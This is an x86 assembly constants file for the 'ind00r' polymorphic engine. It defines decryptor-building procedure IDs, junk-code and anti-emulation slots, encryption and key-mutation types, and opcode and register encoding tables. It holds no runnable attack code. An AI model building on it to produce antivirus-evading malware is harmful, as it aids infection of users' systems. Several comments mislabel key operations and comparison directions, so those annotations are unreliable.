;ind00r polymorph engine by slurp
;+++ poly stuff +++
RANDOM_SEED     equ 0BABAh * 666 + 0BABEh
MAX_POLY_SIZE   equ 3072
; procedure number constantz
LOAD_POINTER    equ   00h
LOAD_COUNTER    equ   01h
LOAD_KEY        equ   02h
DECRYPT_DATA    equ   03h
INC_KEY         equ   04h               ; increment key
INC_POINTER     equ   05h               ; increment pointer by 4
DEC_COUNTER     equ   06h               ; decrement counter by 1
FPU_FOOL        equ   07h               ; some anti emulatin' stuff
JUNK_PROC       equ   08h
MAX_PROCS       equ   JUNK_PROC + JUNK_PROCS + 1
MIN_PROCS       equ   JUNK_PROC + 1
JUNK_PROCS      equ   04h               ; maximal junk procedure count - 1

MAX_PARAMS      equ   04h               ; maximal number of parameters

; encryption type constantz
ENC_XOR       equ 00000000b             ; xor encryption
ENC_ADD       equ 00000001b             ; add encryption
ENC_SUB       equ 00000010b             ; sub encryption
ENC_ROL       equ 00000011b             ; rol encryption
ENC_ROR       equ 00000100b             ; ror encryption
ENC_RND       equ 5

; key increment type constantz
KEY_INC       equ 00000000b             ; rol key with random value
KEY_DEC       equ 00000001b             ; ror key with random value
KEY_ROL       equ 00000010b             ; inc key with random value
KEY_ROR       equ 00000011b             ; dec key with random value
KEY_RND       equ 4
; i386 instruction set constants
; correct order of register on stack after a pushad. offset relative
; to ESP
PUSHAD_EAX      equ   (REG_EDI - REG_EAX) * 4      ; location of EAX
PUSHAD_ECX      equ   (REG_EDI - REG_ECX) * 4      ; location of ECX
PUSHAD_EDX      equ   (REG_EDI - REG_EDX) * 4      ; location of EDX
PUSHAD_EBX      equ   (REG_EDI - REG_EBX) * 4      ; location of EBX
PUSHAD_ESP      equ   (REG_EDI - REG_ESP) * 4      ; location of ESP
PUSHAD_EBP      equ   (REG_EDI - REG_EBP) * 4      ; location of EBP
PUSHAD_ESI      equ   (REG_EDI - REG_ESI) * 4      ; location of ESI
PUSHAD_EDI      equ   (REG_EDI - REG_EDI) * 4      ; location of EDI
PUSHAD_SIZE     equ   8 * 04h                      ; size of pushad record

; dword registerz
REG_EAX         equ   00000000b
REG_ECX         equ   00000001b
REG_EDX         equ   00000010b
REG_EBX         equ   00000011b
REG_ESP         equ   00000100b
REG_EBP         equ   00000101b
REG_ESI         equ   00000110b
REG_EDI         equ   00000111b

; word registerz
REG_AX          equ   00000000b
REG_CX          equ   00000001b
REG_DX          equ   00000010b
REG_BX          equ   00000011b
REG_SP          equ   00000100b
REG_BP          equ   00000101b
REG_SI          equ   00000110b
REG_DI          equ   00000111b

; byte registerz
REG_AL          equ   00000000b
REG_CL          equ   00000001b
REG_DL          equ   00000010b
REG_BL          equ   00000011b
REG_AH          equ   00000100b
REG_CH          equ   00000101b
REG_DH          equ   00000110b
REG_BH          equ   00000111b

; fpu registerz
REG_ST0         equ   00000000b
REG_ST1         equ   00000001b
REG_ST2         equ   00000010b
REG_ST3         equ   00000011b
REG_ST4         equ   00000100b
REG_ST5         equ   00000101b
REG_ST6         equ   00000110b
REG_ST7         equ   00000111b

REG_RND         equ   REG_EDI + 1

; jump opcode constantz
JMP_SHORT       equ   0EBh
JMP_LONG        equ   0E9h
JMPC_SHORT      equ   070h
JMPC_LONG       equ   080h              ; 2 byte opcode!

; conditions

COND_C          equ   002h            ; carry
COND_NC         equ   003h            ; no carry
COND_E          equ   004h            ; equal                   A  = B
COND_NE         equ   005h            ; not equal               A != B
COND_Z          equ   004h            ; zero                    A  = B
COND_NZ         equ   005h            ; not zero                A != B
COND_S          equ   008h            ; sign                   msb = 1
COND_NS         equ   009h            ; no sign                msb = 0
COND_P          equ   00Ah            ; parity even            lsb = 0
COND_NP         equ   00Bh            ; parity odd             lsb = 1
COND_O          equ   000h            ; overflow       msb was toggled
COND_NO         equ   001h            ; no overflow    msb wasn't toggled

COND_B          equ   COND_C          ; below                    A > B
COND_NAE        equ   COND_B          ; neither above or equal   A > B
COND_NB         equ   COND_NC         ; not below                A ó B
COND_AE         equ   COND_NB         ; above or equal           A ó B
COND_BE         equ   006h            ; below or equal           A ò B
COND_NA         equ   COND_BE         ; not above                A ò B
COND_NBE        equ   007h            ; neither below or equal   A < B
COND_A          equ   COND_NBE        ; above                    A < B
COND_L          equ   00Ch            ; less                     A > B
COND_NGE        equ   COND_L          ; neither greater or equal A > B
COND_NL         equ   00Dh            ; not less                 A ó B
COND_GE         equ   COND_NL         ; greater or equal         A ó B
COND_LE         equ   00Eh            ; less or equal            A ò B
COND_NG         equ   COND_LE         ; not greater              A ò B
COND_NLE        equ   00Fh            ; neither less or equal    A < B
COND_G          equ   COND_NLE        ; greater                  A < B

; call opcode constantz
CALL_DIRECT     equ   0E8h

; procedure commands
PROC_ENTER      equ   0C8h
PROC_LEAVE      equ   0C9h
PROC_RETP       equ   0C2h
PROC_RET        equ   0C3h
MOV_EBP_ESP     equ   0EC8Bh

; stack opcodes
PUSH_REG        equ   050h                 ; xor REG_???
POP_REG         equ   058h
PUSH_IMM        equ   068h
PUSH_IMM_SX     equ   06Ah
POP_MEM         equ   08Fh

; increment/decrement opcodes
INC_REG         equ   040h
DEC_REG         equ   048h
INCDEC_GROUP    equ   0FEh

; mov opcodes
MOV_REG_RM      equ   0
MOV_REG_IMM     equ   0B0h ; mov register, immediate
MOV_REG_IMM8    equ   0B0h
MOV_REG_IMM32   equ   0B8h
MOV_MEM_IMM     equ   0C6h ; mov memory, immediate

; extended mov opcodes

MOVX            equ   0B6h
MOVX_BYTE       equ   000h
MOVX_WORD       equ   001h
MOVX_ZX         equ   000h
MOVX_SX         equ   008h

; load effective address
LOAD_EA         equ   08Dh

; Flag set/clear commands
CLR_CRY         equ   0F8h
SET_CRY         equ   0F9h
CLR_INT         equ   0FAh
SET_INT         equ   0FBh
CLR_DIR         equ   0FCh
SET_DIR         equ   0FDh

; Common opcode constants

; prefixes
ESC_2BYTE       equ   0Fh
OPERAND_SIZE    equ   66h
ADDRESS_SIZE    equ   67h

; segment override prefix
OVERRIDE_FS     equ   64h
OVERRIDE_GS     equ   65h

; operand size
OPSIZE_8        equ   00h
OPSIZE_32       equ   01h
OPSIZE_16       equ   02h

; direction
MEM_REG         equ   00h
REG_MEM         equ   01h

; some opcodes support direct EAX/AX/AL access
USE_EAX         equ   04h

XCHG_EAX_REG    equ    090h ; add register number to get opcode (not eax)
OP_NOP          equ    090h ; very obsolete :x<
TEST_EAX_IMM    equ    0A8h

; Shift operation constants
OP_SHIFT        equ    0C0h

SHIFT_IMM       equ    000h ; shift immediate
SHIFT_1         equ    001h ; shift 1 time
SHIFT_CL        equ    002h ; shift cl times
SHIFT_RND       equ    003h ; for choosing random shift.

ROL_SHIFT       equ    000h
ROR_SHIFT       equ    001h
RCL_SHIFT       equ    002h
RCR_SHIFT       equ    003h
SHL_SHIFT       equ    004h
SHR_SHIFT       equ    005h
SAR_SHIFT       equ    006h
RND_SHIFT       equ    007h

OP_GROUP1       equ    080h ; opcode for immediate group 1
OP_GROUP3       equ    0F6h ; opcode for shift group 3

; jmp, call, push, inc, dec group
OP_GROUP5       equ    0FFh ; opcode for jmpcallpushincdec group 5

P_INC           equ    000h
P_DEC           equ    001h
P_CALL_NEAR     equ    002h  ; call dword ptr
P_CALL_FAR      equ    003h  ; call 48-bit ptr
P_JMP_NEAR      equ    004h  ; jmp dword ptr
P_JMP_FAR       equ    005h  ; jmp 48-bit ptr
P_PUSH          equ    006h

; Math operation constants
OPTYPE_ADD      equ   00h
OPTYPE_OR       equ   01h
OPTYPE_ADC      equ   02h
OPTYPE_SBB      equ   03h
OPTYPE_AND      equ   04h
OPTYPE_SUB      equ   05h
OPTYPE_XOR      equ   06h
OPTYPE_CMP      equ   07h
OPTYPE_MOV      equ   008h
OPTYPE_TEST     equ   009h
OPTYPE_XCHG     equ   00Ah

; Math opcode constants
MATH_ADD        equ   OPTYPE_ADD shl 03h
MATH_OR         equ   OPTYPE_OR  shl 03h
MATH_ADC        equ   OPTYPE_ADC shl 03h
MATH_SBB        equ   OPTYPE_SBB shl 03h
MATH_AND        equ   OPTYPE_AND shl 03h
MATH_SUB        equ   OPTYPE_SUB shl 03h
MATH_XOR        equ   OPTYPE_XOR shl 03h
MATH_CMP        equ   OPTYPE_CMP shl 03h

; Immediate opcode constants
IMM_OP          equ   80h
IMM_SX          equ   03h               ; sign extended immediate

; MOD/RM constants

; MOD bits
MOD_NODISP      equ   000h                  ; no displacement
MOD_DISP8       equ   040h                  ; 8-bit displacement
MOD_DISP32      equ   080h                  ; 32-bit displacement
MOD_REG         equ   0C0h                  ; register
_MOD            equ   011000000b            ; mask for MOD-field

MOD_DIRECT      equ   00001000b                 ; use immediate address
MOD_SIB         equ   00010000b                 ; use sib byte

; REG bits
_REG            equ   000111000b            ; mask for REG-field

; RM bits
RM_DIRECT       equ   REG_EBP xor MOD_NODISP
RM_SIB          equ   REG_ESP
_RM             equ   000000111b            ; mask for RM field

; FPU opcodes

FPU_OPCODE      equ   0D8h
FPU_DWORD_OP    equ   0D8h   ; dword ops/fpu reg ops
FPU_DWORD_LDST  equ   0D9h   ; group 1 - 4, FLD, FST, ...
FPU_INT_OP      equ   0DAh   ; dword operations
FPU_INT_LDST    equ   0DBh   ; group 5, FILD, FIST
FPU_QWORD_OP    equ   0DCh   ; qword ops/fpu reg ops
FPU_QWORD_LDST  equ   0DDh   ; qword FILD, FIST
FPU_WORD_OP     equ   0DEh   ; word ops (only mem), and reversed arithmetix
FPU_WORD_LDST   equ   0DFh   ; word FILD, FIST

; FPU opcode + MOD/RM (bl = FPU_FMUL, FDIV...)
;
; they'll fit to the following opcodez:
; FPU_DWORD_OP, FPU_QWORD_OP & FPU_WORD_OP
; IMPORTANT: note that the word operations won't work with fpu registers!

FPU_ADD        equ   000b                   ; MOD/RM bit 3,4,5 = 001
FPU_MUL        equ   001b
FPU_CMP        equ   010b
FPU_COMP       equ   011b
FPU_SUB        equ   100b
FPU_SUBR       equ   101b
FPU_DIV        equ   110b
FPU_DIVR       equ   111b

; FPU_WORD_OP group contains some opcodes with reversed register order.
; this means first comes st(?) and then the first register.
FPU_ADDP       equ   000b                   ; MOD/RM bit 3,4,5 = 001
FPU_MULP       equ   001b
FPU_COMPP      equ   011b
FPU_SUBRP      equ   100b
FPU_SUBP       equ   101b
FPU_DIVRP      equ   110b
FPU_DIVP       equ   111b

FPU_DIR1        equ   000h                     ; direction st, st(?)
FPU_DIR2        equ   004h                     ; direction st(?), st

; FPU stand alone instructions
FPU_INIT        equ   0E3DBh
FPU_SQRT        equ   0FAD9h

FPU_LD1         equ   0E8D9h
FPU_LDL2T       equ   0E9D9h
FPU_LDL2E       equ   0EAD9h
FPU_LDPI        equ   0EBD9h
FPU_LDLG2       equ   0ECD9h
FPU_LDLN2       equ   0EDD9h
FPU_LDZ         equ   0EED9h

FPU_WAIT        equ   09Bh

FPU_STORE       equ   02h
FPU_LOAD        equ   00h

;++++++++++++++++++++++